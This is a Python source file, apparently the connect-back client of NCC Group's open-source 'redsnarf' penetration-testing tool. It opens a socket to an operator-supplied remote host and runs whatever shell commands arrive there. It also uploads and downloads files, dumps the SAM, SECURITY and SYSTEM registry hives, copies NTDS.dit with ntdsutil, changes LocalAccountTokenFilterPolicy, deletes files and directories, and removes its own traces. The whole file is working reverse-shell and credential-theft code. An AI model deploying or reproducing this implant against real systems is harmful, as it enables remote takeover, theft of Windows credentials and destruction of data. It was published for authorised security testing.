#! /usr/bin/python
# Released as open source by NCC Group Plc - https://www.nccgroup.trust/uk/
# https://github.com/nccgroup/redsnarf
# Released under Apache V2 see LICENCE for more information
#
# Compile with py2exe
#

import socket 
import subprocess 
import os
import shutil

def banner():
    print """
    ______           .____________                     _____  
\______   \ ____   __| _/   _____/ ____ _____ ________/ ____\ 
 |       _// __ \ / __ |\_____  \ /    \\__  \\_  __ \   __\  
 |    |   \  ___// /_/ |/        \   |  \/ __ \|  | \/|  |    
 |____|_  /\___  >____ /_______  /___|  (____  /__|   |__|    
        \/     \/     \/       \/     \/     \/                      
                                  redsnarf.ff0000@gmail.com
                                                  @redsnarf
"""
    print "\nE D Williams - NCCGroup"
    print "R Davy - NCCGroup\n"

def upload(conn,command,filename):
    
    downloadpth=os.getcwd()
    
    conn.send(command)

    f = open(downloadpth+"\\"+filename,'wb')
    
    while True:  
        bits = conn.recv(4096)
        if 'Unable to find out the file' in bits:
            print '[-]Unable to find out the file..'
            break

        if bits.endswith("DONE"):
            f.write(bits[0:len(bits)-4])
            f.close()
            print '[+]Upload complete..'
            break
        
        if not bits:
            print '[+]Upload complete..'
            f.close()
            break

        f.write(bits)
  
def transfer(s,path):
    print path
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(4096)
        print "Sending"
        while packet != '':
            s.send(packet) 
            packet = f.read(4096)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('[-]Unable to find out the file')

def connect():
    #Show banner
    banner()
    #Get remote ip address and port to connect to
    ipaddress=raw_input("[+]Enter the Remote IP address you wish to connect to: ")
    port=raw_input("[+]Enter the Remote Port you wish to connect to: ")
    #Create our connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipaddress, int(port)))
 
    while True: 
        try:
            command =  s.recv(2048)
            
            #Close our connection nice and tidily
            if command=='quit':
                s.close()
                print "[+]Bye Bye"
                break 
            elif 'upload' in command: 
                #Get the file name from the download string and pass to transfer                              
                #print command
                file=command.split('/')
                
                #Try and transfer file
                #print file[len(file)-1]
                upload(s,command,file[len(file)-1])

            #Looks like we're going to download something
            elif 'download' in command:            
                
                grab,path = command.split('*')
                try:                          
                    transfer(s,path)
                except Exception,e:
                    s.send ( str(e) )
                    pass
            #Change Directory
            elif 'cd ' in command:
                code,directory=command.split(' ')
                os.chdir(directory)
                s.send("[+]CWD "+os.getcwd())
                print "[+]Changing Directory"

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Create a Directory
            elif 'mkdir ' in command:
                code,directory=command.split(' ')
                os.mkdir(directory)
                s.send("[+]MKDIR ")
                print "[+]Making Directory"

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Remove a Directory including all files
            elif 'rmdir ' in command:
                code,directory=command.split(' ')
                shutil.rmtree(directory, ignore_errors=False, onerror=None)
                s.send("[+]RMDIR ")
                print "[+]Removing Directory"

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Delete a file
            elif 'del ' in command:
                code,file=command.split(' ')
                os.remove(file)
                s.send("[+]DEL ")
                print "[+]Deleting File"

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Enable Local Access Token Filter
            elif command=='enable_lat':
                print "[+]Enable LAT"
                save="reg.exe add \"HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /D 1"
                CMD =  subprocess.Popen(save, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Disable Local Access Token Filter
            elif command=='disable_lat':
                print "[+]Disable LAT"
                save="reg.exe add \"HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /D 0"
                CMD =  subprocess.Popen(save, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            elif command=='creds':
                #Remove any existing versions
                if os.path.exists("c:\sam"):
                    os.remove("c:\sam")
                if os.path.exists("c:\system"):
                    os.remove("c:\system")
                if os.path.exists("c:\security"):
                    os.remove("c:\security")
                
                print "[+]Saving SAM/SECURITY/SYSTEM"
                save="reg.exe save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system"
                CMD =  subprocess.Popen(save, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            elif command=='ntds_dump':
                #Remove any existing versions
                if os.path.exists("c:\\redsnarf"):
                    print "Found previous dump, removing..."
                    deldir="rmdir \"c:\\redsnarf\" /s /q"
                    CMD =  subprocess.Popen(deldir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    s.send( CMD.stdout.read()  ) 
                    s.send( CMD.stderr.read()  )
                    
                                
                print "[+]Using NTDS Util to dump NTDS.dit"
                save="ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\redsnarf\" q q"
                CMD =  subprocess.Popen(save, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
                
            elif command=='creds_cleanup':
                #Remove any existing versions
                if os.path.exists("c:\sam"):
                    os.remove("c:\sam")
                if os.path.exists("c:\system"):
                    os.remove("c:\system")
                if os.path.exists("c:\security"):
                    os.remove("c:\security")
                
                print "[+]Cleaned Up SAM/SECURITY/SYSTEM"
                s.send ("[+]Cleaned Up SAM/SECURITY/SYSTEM on remote machine")
              
                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            elif command=='privesc':
                #Remove any existing versions
                if os.path.exists(os.getcwd()+"\privesc.csv"):
                    os.remove(os.getcwd()+"\privesc.csv")

                deldir="systeminfo /FO CSV > privesc.csv"
                CMD =  subprocess.Popen(deldir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )
                
                print "[+]Generating SystemInfo"
                s.send ("path="+os.getcwd()+"\privesc.csv")
              
                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            elif command=='privesc_cleanup':
                if os.path.exists(os.getcwd()+"\privesc.csv"):
                    print "Found previous privesc.csv, Cleaning up like we were never here..."
                    os.remove(os.getcwd()+"\privesc.csv")
              
                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            elif command=='ntds_cleanup':
                if os.path.exists("c:\\redsnarf"):
                    print "Found previous dump, Cleaning up like we were never here..."
                    deldir="rmdir \"c:\\redsnarf\" /s /q"
                    CMD =  subprocess.Popen(deldir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    s.send( CMD.stdout.read()  ) 
                    s.send( CMD.stderr.read()  )
              
                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
            #Lock Workstation
            elif command=='lock_workstation':
                lockcmd="c:\\windows\\System32\\rundll32.exe user32.dll,LockWorkStation"
                CMD =  subprocess.Popen(lockcmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )
              
                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")

            #Anything else
            else:
                CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send( CMD.stdout.read()  ) 
                s.send( CMD.stderr.read()  )

                #Signal End of Transfer
                print "[+]ET"
                s.send("[+]ET")
                
        #When it all goes wrong!
        except Exception,e:
                s.send ( str(e) )

                #Signal End of Transfer
                s.send("[+]ET")
                pass

def main ():
    connect()
main()











